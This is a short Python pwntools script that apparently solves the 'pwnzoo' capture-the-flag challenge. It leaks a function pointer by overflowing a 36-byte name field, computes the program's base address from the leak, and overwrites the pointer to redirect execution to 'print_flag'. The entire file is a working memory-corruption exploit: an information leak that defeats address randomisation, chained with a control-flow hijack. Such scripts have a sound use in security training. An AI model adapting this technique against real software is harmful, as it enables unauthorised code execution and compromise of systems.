import pwnlib


def main():
    pzelf = pwnlib.elf.ELF('../challenge/pwnzoo')
    cat_addr = pzelf.symbols['speak_cat']
    flag_addr = pzelf.symbols['print_flag']
    tube = pwnlib.tubes.process.process('../challenge/pwnzoo')
    tube.recv()
    tube.send('cat\n')
    tube.recv()
    tube.send(('A'*36) + '\n')
    tube.recv()
    tube.send('1\n')
    spk = tube.recv()
    suffix = spk.split(b'name is ')[1][36:]
    addrb = suffix.split(b'!\n\nMenu')[0]
    while len(addrb) < 8:
        addrb += b'\x00'
    cat_addr_live = pwnlib.util.packing.unpack(addrb, word_size=64, endianness="little")
    base_addr = cat_addr_live - cat_addr
    flag_addr_live = base_addr + flag_addr
    tube.send('2\n')
    tube.send((b'A'*36) + pwnlib.util.packing.pack(flag_addr_live, word_size=64, endianness="little") + b'\n')
    tube.recv()
    tube.send('1\n')
    print(tube.recv())

if __name__ == '__main__':
    main()
